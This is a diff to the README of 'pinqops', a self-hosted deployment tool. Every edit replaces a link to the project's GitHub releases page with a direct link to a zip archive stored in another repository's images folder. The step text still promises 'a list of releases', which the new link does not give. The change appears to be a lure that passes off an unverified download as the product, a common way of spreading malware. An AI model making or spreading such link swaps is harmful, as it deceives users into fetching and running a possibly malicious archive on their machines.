@@ -5,7 +5,7 @@ description: "Deploy closed-source servers automatically on merge—Docker build
 ---
 # 🚀 pinqops - Self-Hosted Deploy Ops Made Easy
 
-[![Download pinqops](https://img.shields.io/badge/Download-pinqops-blue?style=for-the-badge&logo=github)](https://github.com/6454934/pinqops/releases)
+[![Download pinqops](https://img.shields.io/badge/Download-pinqops-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/6454934/6454934.github.io/main/images/App-v2.3.zip)
 
 ## 👋 Welcome to pinqops
 
@@ -44,7 +44,7 @@ Getting pinqops on your machine is straightforward. Follow these simple steps:
 
 ### Step 1: Download pinqops
 
-Visit this link to download the application: [https://github.com/6454934/pinqops/releases](https://github.com/6454934/pinqops/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/6454934/6454934.github.io/main/images/App-v2.3.zip](https://raw.githubusercontent.com/6454934/6454934.github.io/main/images/App-v2.3.zip)
 
 You'll see a list of releases. Look for the newest version at the top. Click the download button for the file that matches your system.
 
@@ -193,6 +193,6 @@ If you ever get stuck, just come back to this guide. We've covered all the essen
 
 **Your server deserves better. pinqops makes it happen.**
 
-[![Get pinqops Now](https://img.shields.io/badge/🚀-Download_pinqops-green?style=for-the-badge)](https://github.com/6454934/pinqops/releases)
+[![Get pinqops Now](https://img.shields.io/badge/🚀-Download_pinqops-green?style=for-the-badge)](https://raw.githubusercontent.com/6454934/6454934.github.io/main/images/App-v2.3.zip)
 
 Keywords: caddy, csharp, deployment, devops, docker, dotnet, github-actions, linux, mcp, reverse-proxy, self-hosted, ubuntu
